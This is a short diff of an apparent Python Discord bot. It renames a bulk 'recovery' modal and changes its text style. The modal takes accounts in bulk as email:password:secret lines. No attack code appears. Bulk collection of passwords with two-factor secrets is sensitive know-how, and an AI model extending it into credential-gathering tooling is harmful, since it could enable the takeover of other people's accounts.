@@ -4,12 +4,12 @@ import discord
 from securing.recovery_secure import recovery_secure
 from ui.buttons.account_details import accountInfo
 
-class BulkRecoveryModal(ui.Modal):
+class BulkAuthRecoveryModal(ui.Modal):
     def __init__(self):
         super().__init__(title="Bulk Password + Secret")
         self.add_item(ui.InputText(
             label="Accounts (one per line)",
-            style=discord.InputTextStyle.paragraph,
+            style=discord.InputTextStyle.long,
             placeholder="email:password:secret\nemail2:password2:secret2",
             required=True
         ))
